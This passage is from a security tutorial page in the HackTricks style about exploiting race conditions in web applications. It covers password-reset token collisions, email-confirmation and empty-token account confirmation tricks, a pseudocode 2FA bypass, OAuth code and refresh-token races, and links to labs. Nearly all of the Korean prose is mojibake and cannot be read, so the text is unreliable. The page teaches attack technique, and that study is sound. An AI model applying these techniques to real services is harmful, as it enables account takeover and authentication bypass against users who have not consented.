* ì‹ë³„ëœ ì—”ë“œí¬ì¸íŠ¸ì— ëŒ€í•´ ë ˆì´ìŠ¤ ì¡°ê±´ ê³µê²©ì„ í…ŒìŠ¤íŠ¸í•˜ê³  ì˜ˆìƒ ê²°ê³¼ì—ì„œì˜ í¸ì°¨ë¥¼ ê´€ì°°í•©ë‹ˆë‹¤. ì˜ˆìƒì¹˜ ëª»í•œ ì‘ë‹µì´ë‚˜ ì• í”Œë¦¬ì¼€ì´ì…˜ ë™ì‘ì˜ ë³€í™”ëŠ” ì·¨ì•½ì ì„ ì‹ í˜¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. **ì·¨ì•½ì  ì…ì¦í•˜ê¸°**
* ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë° í•„ìš”í•œ ìµœì†Œ ìš”ì²­ ìˆ˜ë¡œ ê³µê²©ì„ ì¢í™ë‹ˆë‹¤. ì¢…ì¢… ë‘ ê°œì˜ ìš”ì²­ë§Œ í•„ìš”í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ëŠ” ì •ë°€í•œ íƒ€ì´ë°ì´ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— ì—¬ëŸ¬ ë²ˆì˜ ì‹œë„ë‚˜ ìë™í™”ê°€ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì‹œê°„ ë¯¼ê° ê³µê²©

ìš”ì²­ì˜ íƒ€ì´ë°ì„ ì •ë°€í•˜ê²Œ ì¡°ì •í•˜ë©´ ì·¨ì•½ì ì„ ë“œëŸ¬ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ ë³´ì•ˆ í† í°ì— íƒ€ì„ìŠ¤íƒ¬í”„ì™€ ê°™ì€ ì˜ˆì¸¡ ê°€ëŠ¥í•œ ë°©ë²•ì´ ì‚¬ìš©ë  ë•Œ ê·¸ë ‡ìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, íƒ€ì„ìŠ¤íƒ¬í”„ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • í† í°ì„ ìƒì„±í•˜ë©´ ë™ì‹œì— ìš”ì²­ì— ëŒ€í•´ ë™ì¼í•œ í† í°ì´ í—ˆìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì•…ìš©í•˜ê¸° ìœ„í•´:**

* ë‹¨ì¼ íŒ¨í‚· ê³µê²©ê³¼ ê°™ì€ ì •ë°€í•œ íƒ€ì´ë°ì„ ì‚¬ìš©í•˜ì—¬ ë™ì‹œ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ìš”ì²­ì„ í•©ë‹ˆë‹¤. ë™ì¼í•œ í† í°ì€ ì·¨ì•½ì ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

**ì˜ˆì‹œ:**

* ë‘ ê°œì˜ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • í† í°ì„ ë™ì‹œì— ìš”ì²­í•˜ê³  ë¹„êµí•©ë‹ˆë‹¤. ì¼ì¹˜í•˜ëŠ” í† í°ì€ í† í° ìƒì„±ì˜ ê²°í•¨ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

**ì´ê²ƒì„ í™•ì¸í•˜ì„¸ìš”** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **ì—ì„œ ì‹œë„í•´ ë³´ì„¸ìš”.**

## Hidden substates case studies

### Pay & add an Item

ì´ [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)ë¥¼ í™•ì¸í•˜ì—¬ ìƒì ì—ì„œ **ì§€ë¶ˆ**í•˜ê³  **ì¶”ê°€ í•­ëª©ì„ ì¶”ê°€í•˜ëŠ” ë°©ë²•**ì„ ì•Œì•„ë³´ì„¸ìš”. **ì§€ë¶ˆí•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.**

### Confirm other emails

ì•„ì´ë””ì–´ëŠ” **ì´ë©”ì¼ ì£¼ì†Œë¥¼ í™•ì¸í•˜ê³  ë™ì‹œì— ë‹¤ë¥¸ ì´ë©”ì¼ë¡œ ë³€ê²½í•˜ì—¬ í”Œë«í¼ì´ ìƒˆë¡œ ë³€ê²½ëœ ì´ë©”ì¼ì„ í™•ì¸í•˜ëŠ”ì§€ ì•Œì•„ë³´ëŠ” ê²ƒì…ë‹ˆë‹¤.**

### Change email to 2 emails addresses Cookie based

[**ì´ ì—°êµ¬**](https://portswigger.net/research/smashing-the-state-machine)ì— ë”°ë¥´ë©´ Gitlabì€ ì´ ë°©ë²•ìœ¼ë¡œ ì¸ìˆ˜ ê³µê²©ì— ì·¨ì•½í–ˆìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´ **í•˜ë‚˜ì˜ ì´ë©”ì¼ì˜ ì´ë©”ì¼ í™•ì¸ í† í°ì„ ë‹¤ë¥¸ ì´ë©”ì¼ë¡œ ë³´ë‚¼ ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.**

**ì´ê²ƒì„ í™•ì¸í•˜ì„¸ìš”** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **ì—ì„œ ì‹œë„í•´ ë³´ì„¸ìš”.**

### Hidden Database states / Confirmation Bypass

**ë°ì´í„°ë² ì´ìŠ¤**ì— **ì •ë³´ë¥¼ ì¶”ê°€í•˜ê¸° ìœ„í•´ 2ê°œì˜ ì„œë¡œ ë‹¤ë¥¸ ì“°ê¸°**ê°€ ì‚¬ìš©ë˜ë©´, **ì²« ë²ˆì§¸ ë°ì´í„°ë§Œ ë°ì´í„°ë² ì´ìŠ¤ì— ê¸°ë¡ëœ** ì§§ì€ ì‹œê°„ì´ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì‚¬ìš©ìë¥¼ ìƒì„±í•  ë•Œ **ì‚¬ìš©ì ì´ë¦„**ê³¼ **ë¹„ë°€ë²ˆí˜¸**ê°€ **ê¸°ë¡ë˜ê³ ** **ìƒˆë¡œ ìƒì„±ëœ ê³„ì •ì„ í™•ì¸í•˜ê¸° ìœ„í•œ í† í°**ì´ ê¸°ë¡ë©ë‹ˆë‹¤. ì´ëŠ” ì§§ì€ ì‹œê°„ ë™ì•ˆ **ê³„ì •ì„ í™•ì¸í•˜ê¸° ìœ„í•œ í† í°ì´ null**ì„ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ **ê³„ì •ì„ ë“±ë¡í•˜ê³  ë¹ˆ í† í°**(`token=` ë˜ëŠ” `token[]=` ë˜ëŠ” ê¸°íƒ€ ë³€í˜•)ì„ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ìš”ì²­ì„ ë³´ë‚´ ì¦‰ì‹œ ê³„ì •ì„ í™•ì¸í•˜ë©´ ì´ë©”ì¼ì„ ì œì–´í•˜ì§€ ì•ŠëŠ” **ê³„ì •ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

**ì´ê²ƒì„ í™•ì¸í•˜ì„¸ìš”** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **ì—ì„œ ì‹œë„í•´ ë³´ì„¸ìš”.**

### Bypass 2FA

ë‹¤ìŒ ì˜ì‚¬ ì½”ë“œëŠ” ë ˆì´ìŠ¤ ì¡°ê±´ì— ì·¨ì•½í•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ ì„¸ì…˜ì´ ìƒì„±ë˜ëŠ” ë™ì•ˆ **2FAê°€ ì ìš©ë˜ì§€ ì•ŠëŠ”** ë§¤ìš° ì§§ì€ ì‹œê°„ì´ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 ì˜êµ¬ ì§€ì†ì„±

ì—¬ëŸ¬ [**OAUth ì œê³µì**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers)ê°€ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì„œë¹„ìŠ¤ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìƒì„±í•˜ê³  ì œê³µìê°€ ë“±ë¡í•œ ì‚¬ìš©ìë¥¼ ì¸ì¦í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ **í´ë¼ì´ì–¸íŠ¸**ëŠ” **ê·€í•˜ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜**ì´ **OAUth ì œê³µì** ë‚´ì˜ ì¼ë¶€ ë°ì´í„°ì— ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ **í—ˆìš©í•´ì•¼** í•©ë‹ˆë‹¤.\
ì—¬ê¸°ê¹Œì§€ëŠ” êµ¬ê¸€/ë§í¬ë“œì¸/ê¹ƒí—ˆë¸Œ ë“±ì—ì„œ "_ì• í”Œë¦¬ì¼€ì´ì…˜ \<InsertCoolName>ì´ ê·€í•˜ì˜ ì •ë³´ì— ì ‘ê·¼í•˜ê³ ì í•©ë‹ˆë‹¤. í—ˆìš©í•˜ì‹œê² ìŠµë‹ˆê¹Œ?_"ë¼ëŠ” í˜ì´ì§€ê°€ í‘œì‹œë˜ëŠ” ì¼ë°˜ì ì¸ ë¡œê·¸ì¸ì…ë‹ˆë‹¤.

#### `authorization_code`ì˜ ê²½ìŸ ì¡°ê±´

**ë¬¸ì œ**ëŠ” ì‚¬ìš©ìê°€ **í—ˆìš©**í•  ë•Œ ë°œìƒí•˜ë©°, ì•…ì˜ì ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì— **`authorization_code`**ê°€ ìë™ìœ¼ë¡œ ì „ì†¡ë©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ì´ **ì• í”Œë¦¬ì¼€ì´ì…˜ì€ OAUth ì„œë¹„ìŠ¤ ì œê³µìì˜ ê²½ìŸ ì¡°ê±´ì„ ì•…ìš©í•˜ì—¬ ê·€í•˜ì˜ ê³„ì •ì— ëŒ€í•´ **`authorization_code`**ë¡œë¶€í„° ì—¬ëŸ¬ ê°œì˜ AT/RT** (_ì¸ì¦ í† í°/ë¦¬í”„ë ˆì‹œ í† í°_)ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ, ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ê·€í•˜ì˜ ë°ì´í„°ì— ì ‘ê·¼í•˜ë„ë¡ í—ˆìš©í•œ ì‚¬ì‹¤ì„ ì•…ìš©í•˜ì—¬ **ì—¬ëŸ¬ ê³„ì •ì„ ìƒì„±**í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ê·€í•˜ì˜ ë°ì´í„°ì— ì ‘ê·¼í•˜ëŠ” ê²ƒì„ **ì¤‘ì§€í•˜ë©´ AT/RT ìŒ ì¤‘ í•˜ë‚˜ëŠ” ì‚­ì œë˜ì§€ë§Œ, ë‚˜ë¨¸ì§€ëŠ” ì—¬ì „íˆ ìœ íš¨í•©ë‹ˆë‹¤**.

#### `Refresh Token`ì˜ ê²½ìŸ ì¡°ê±´

**ìœ íš¨í•œ RTë¥¼ ì–»ì€ í›„** ì—¬ëŸ¬ ê°œì˜ AT/RTë¥¼ ìƒì„±í•˜ê¸° ìœ„í•´ **ì•…ìš©í•  ìˆ˜ ìˆìœ¼ë©°**, **ì‚¬ìš©ìê°€ ì•…ì˜ì ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ìì‹ ì˜ ë°ì´í„°ì— ì ‘ê·¼í•˜ëŠ” ê¶Œí•œì„ ì·¨ì†Œí•˜ë”ë¼ë„, ì—¬ëŸ¬ RTëŠ” ì—¬ì „íˆ ìœ íš¨í•©ë‹ˆë‹¤.**

## **ì›¹ì†Œì¼“ì˜ RC**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC)ì—ì„œ **ì›¹ì†Œì¼“**ì˜ **ê²½ìŸ ì¡°ê±´**ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ **ë³‘ë ¬ë¡œ** ì›¹ì†Œì¼“ ë©”ì‹œì§€ë¥¼ ì „ì†¡í•˜ëŠ” Java PoCë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì°¸ê³  ë¬¸í—Œ

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜, **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì§€ê¸ˆ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
